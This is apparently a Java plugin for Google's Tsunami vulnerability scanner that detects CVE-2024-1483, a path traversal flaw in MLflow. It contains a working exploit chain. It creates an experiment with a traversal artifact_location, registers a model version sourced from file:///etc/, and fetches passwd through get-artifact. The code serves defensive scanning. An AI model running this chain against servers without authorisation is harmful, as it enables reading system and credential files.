/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cve.cve20241483;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.MediaType;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.UUID;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2024-1483 . */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve20241483Detector",
    version = "0.1",
    description = Cve20241483Detector.VULN_DESCRIPTION,
    author = "rdj (rdj@crackatoa.id)",
    bootstrapModule = Cve20241483DetectorBootstrapModule.class)
public final class Cve20241483Detector implements VulnDetector {

  @VisibleForTesting static final Pattern DETECTION_PATTERN = Pattern.compile("(root:[x*]:0:0:)");

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "A path traversal vulnerability exists in mlflow/mlflow version < 2.12.1, allowing attackers"
          + " to access arbitrary files on the server";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  Cve20241483Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE_2024_1483"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2024-1483").build())
            .setSeverity(Severity.HIGH)
            .setTitle("CVE-2024-1483 MLFlow Path Traversal")
            .setDescription(VULN_DESCRIPTION)
            .setRecommendation("Upgrade MLflow version to 2.12.1 and above")
            .build());
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2024-1483 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isMLFlowWebApplication)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isMLFlowWebApplication(NetworkService networkService) {
    try {
      String mlFlowUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
      HttpResponse httpResponse =
          httpClient.send(
              get(mlFlowUrl)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(USER_AGENT, "TSUNAMI_SCANNER").build())
                  .build(),
              networkService);
      if (httpResponse.status() == HttpStatus.OK
          && httpResponse.bodyString().isPresent()
          && httpResponse.bodyString().get().contains("<title>MLflow</title>")) {
        logger.atInfo().log("Mlflow dashboard detected");
        return true;
      } else {
        return false;
      }
    } catch (RuntimeException | IOException e) {
      logger.atWarning().withCause(e).log(
          "Request to target %s failed",
          NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String name =
        "tsunami_scanner_" + UUID.randomUUID().toString().replaceAll("-", "").substring(0, 4);
    String expId = createExperiment(name, networkService);
    String rId = createRun(expId, networkService);
    registerModel(name, networkService);
    createModelVersion(name, rId, networkService);
    String getArtifactUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "model-versions/get-artifact?path=passwd&name="
            + name
            + "&version=1";
    try {
      HttpResponse httpResponse =
          httpClient.send(
              get(getArtifactUrl)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(USER_AGENT, "TSUNAMI_SCANNER").build())
                  .build());
      if (httpResponse.status() == HttpStatus.OK && httpResponse.bodyString().isPresent()) {
        if (DETECTION_PATTERN.matcher(httpResponse.bodyString().get()).find()) {
          return true;
        }
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
    return false;
  }

  private String createExperiment(String name, NetworkService networkService) {
    String experimentId = "";
    String createExperimentUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "ajax-api/2.0/mlflow/experiments/create";
    JsonObject jsonObj = new JsonObject();
    jsonObj.addProperty("name", name);
    jsonObj.addProperty(
        "artifact_location", "http:///#/../../../../../../../../../../../../../../etc/");
    String payload = new Gson().toJson(jsonObj);
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(createExperimentUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(payload))
                  .build());
      return JsonParser.parseString(httpResponse.bodyString().get())
          .getAsJsonObject()
          .get("experiment_id")
          .getAsString();
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
    return experimentId;
  }

  private String createRun(String experimentId, NetworkService networkService) {
    String runId = "";
    String createRunUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "api/2.0/mlflow/runs/create";
    JsonObject jsonObj = new JsonObject();
    jsonObj.addProperty("experiment_id", experimentId);
    String payload = new Gson().toJson(jsonObj);
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(createRunUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(payload))
                  .build());

      return JsonParser.parseString(httpResponse.bodyString().get())
          .getAsJsonObject()
          .getAsJsonObject("run")
          .getAsJsonObject("info")
          .get("run_id")
          .getAsString();
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
    return runId;
  }

  private void registerModel(String name, NetworkService networkService) {
    String registerModelUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "ajax-api/2.0/mlflow/registered-models/create";
    JsonObject jsonObj = new JsonObject();
    jsonObj.addProperty("name", name);
    String payload = new Gson().toJson(jsonObj);
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(registerModelUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(payload))
                  .build());
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
  }

  private void createModelVersion(String name, String runId, NetworkService networkService) {
    String createModelUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "ajax-api/2.0/mlflow/model-versions/create";
    JsonObject jsonObj = new JsonObject();
    jsonObj.addProperty("name", name);
    jsonObj.addProperty("run_id", runId);
    jsonObj.addProperty("source", "file:///etc/");
    String payload = new Gson().toJson(jsonObj);
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(createModelUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(payload))
                  .build());
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().getFirst())
        .build();
  }
}
